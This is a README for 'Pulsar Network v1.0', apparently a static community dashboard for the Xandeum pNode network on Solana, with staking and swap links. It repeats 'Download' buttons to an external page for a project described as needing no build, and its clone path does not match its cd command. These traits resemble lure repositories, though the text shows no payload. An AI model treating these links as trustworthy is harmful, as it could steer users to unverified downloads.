# Pulsar Network v1.0 - blockchain monitor 2026

> A live, read-only dashboard for exploring the Xandeum pNode gossip network on Solana, with node health, stake information, and learning materials available without a wallet connection or sign-up.

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jamesgabe/pulsar-network-v1-monitor?style=flat-square)](https://github.com/jamesgabe/pulsar-network-v1-monitor)

---

<p align="center">
  <a href="https://jamesgabe.github.io/pulsar-network-v1-monitor/">
    <img src="https://img.shields.io/badge/Download-Pulsar%20Network%20Latest-brightgreen?style=for-the-badge" alt="Download Pulsar Network">
  </a>
</p>

> **[Direct Download - Pulsar Network v1.0](https://jamesgabe.github.io/pulsar-network-v1-monitor/)**

---

[Download Latest Build](https://jamesgabe.github.io/pulsar-network-v1-monitor/)

---

## What Pulsar Network Is

Pulsar Network gives you a live, independent window into the Xandeum pNode storage network running on Solana. It is aimed at DePIN followers, stakers, and general Web3 users who want to inspect node placement, software releases, on-chain stake totals, and uptime data in one place. The dashboard combines an interactive world map with tabular views, using public pRPC get-pods gossip data together with Solana stake and yuga information, plus XAND/SOL pricing pulled from CoinGecko.

This repository is not an official Xandeum product and is intended as a source-available community utility. It stays privacy-friendly by avoiding wallet connections, account creation, and any write access, keeping the experience strictly read-only. For newcomers, the included Educational Insights articles explain the pNode ecosystem, while advanced visitors can use the staking funnel for Pulsar's licensed pNodes and the embedded Jupiter swap option for token exchanges.

---

## Capabilities

- Live view of Xandeum pNode gossip network activity
- Node health indicators, location display, and software version tracking
- Solana-derived stake and yuga metrics
- CoinGecko-backed XAND/SOL price updates
- Educational Insights articles focused on DePIN and staking
- Staking funnel for delegating to Pulsar's licensed pNodes
- Optional in-site token swaps through Jupiter
- Read-only design with no wallet connection or account creation

---

## Setup

Clone the repo locally or place it directly on a web server:

```bash
git clone https://github.com/jamesgabe/pulsar-network-v1-monitor.git
cd pulsar-network-monitor
```

Open `index.html` in a current web browser. No build pipeline or server-side dependencies are needed.

---

## How to Use

Start by opening the HTML file in your browser. The dashboard loads fresh data from public pRPC endpoints and Solana. Use the world map to review geographic distribution, switch to the table view for detailed metrics, and open the Insights area for educational content. If you want to delegate stake, use the provided funnel link to Pulsar's licensed pNodes. For token swaps, the site includes a Jupiter widget.

---

## Configuration Notes

Browser local storage holds all settings on the client side. Basic operation does not require any configuration files. On each page load, the dashboard retrieves the latest gossip data and on-chain metrics automatically. Users who want to customize behavior can edit the JavaScript source to adjust default endpoints or refresh intervals.

---

## Requirements

- Modern web browser (Chrome, Firefox, Edge, Safari)
- Active internet connection for live data feeds
- No additional runtime, database, or server infrastructure

---

## FAQ

**Is this connected to Xandeum officially?**
No. Pulsar Network is a community-built, source-available monitor and is independent from Xandeum.

**Do I need a wallet or account to access it?**
No. It works as a read-only dashboard and does not require wallet connection or registration.

**How frequently is the information refreshed?**
Data is refreshed automatically whenever the page loads from public pRPC and Solana endpoints.

**Can I delegate stake from here?**
Yes. The dashboard includes a staking funnel for delegation to Pulsar's licensed pNodes.

**How do I report bugs or ask for new features?**
Open an issue in the GitHub repository.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
